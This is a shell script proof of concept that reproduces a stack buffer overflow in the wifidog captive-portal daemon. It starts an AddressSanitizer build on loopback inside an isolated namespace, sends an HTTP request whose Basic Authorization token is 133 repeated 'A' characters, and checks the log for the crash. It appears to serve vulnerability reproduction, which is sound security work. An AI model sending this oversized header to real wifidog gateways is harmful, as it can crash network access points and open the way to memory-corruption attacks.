#!/usr/bin/env sh
set -eu

ROOT_DIR="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
WIFIDOG="$ROOT_DIR/src/wifidog"
CONF="$ROOT_DIR/poc/wifidog-loopback.conf"
LOG="$ROOT_DIR/poc/poc-basic-auth-overflow.log"

# Base64 token length (in characters). 133 is enough to trigger the bug reliably.
PAYLOAD_LEN="${PAYLOAD_LEN:-133}"

command -v unshare >/dev/null 2>&1 || { echo "error: unshare not found" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "error: python3 not found" >&2; exit 1; }

rm -f "$LOG"

PAYLOAD_LEN="$PAYLOAD_LEN" unshare -Urn sh -c "
set -eu
cd \"$ROOT_DIR\"
ip link set lo up
rm -f /tmp/wdctl-wifidog-poc.sock

ASAN_OPTIONS=abort_on_error=1:symbolize=0:halt_on_error=1 \"$WIFIDOG\" -f -c \"$CONF\" -d 0 >\"$LOG\" 2>&1 &
pid=\$!

for i in 1 2 3 4 5 6 7 8 9 10; do
  python3 - <<'PY' && break || true
import socket, sys
try:
    s = socket.create_connection(('127.0.0.1', 2060), timeout=0.2)
    s.close()
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  sleep 0.2
done

python3 - <<'PY'
import os, socket
payload_len = int(os.environ.get('PAYLOAD_LEN', '133'))
payload = 'A' * payload_len
req = (
    'GET /wifidog/status HTTP/1.0\\r\\n'
    'Host: localhost\\r\\n'
    f'Authorization: Basic {payload}\\r\\n'
    '\\r\\n'
)
s = socket.create_connection(('127.0.0.1', 2060))
s.sendall(req.encode())
s.close()
PY

sleep 1
if kill -0 \"\$pid\" 2>/dev/null; then
  echo \"[poc] wifidog still running (no crash detected)\" >>\"$LOG\"
  kill \"\$pid\" 2>/dev/null || true
fi
wait \"\$pid\" || true
"

echo "Log: $LOG"
if command -v rg >/dev/null 2>&1; then
  rg -n "AddressSanitizer|stack-buffer-overflow|SUMMARY" "$LOG" || true
fi
